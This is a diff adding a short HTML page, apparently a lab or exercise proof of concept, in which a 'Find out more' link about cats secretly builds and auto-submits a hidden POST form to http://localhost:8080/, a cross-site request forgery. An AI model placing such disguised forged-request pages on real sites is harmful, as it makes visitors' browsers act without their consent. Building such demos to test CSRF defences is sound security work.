@@ -1,0 +1,13 @@
+<html>
+<body>
+<h1>Check our cats location</h1>
+<a href="https://images.google.com/?q=cats" onclick="return generate_csrf();">Find out more</a>
+<script type="text/javascript">
+function generate_csrf() {
+   document.body.innerHTML += '<form id="dynForm" action="http://localhost:8080/" method="post"><input type="hidden" name="content" value="Do whatever the jj says"></form>';
+   document.getElementById("dynForm").submit();
+   return true;
+   }
+</script>
+</body>
+</html>
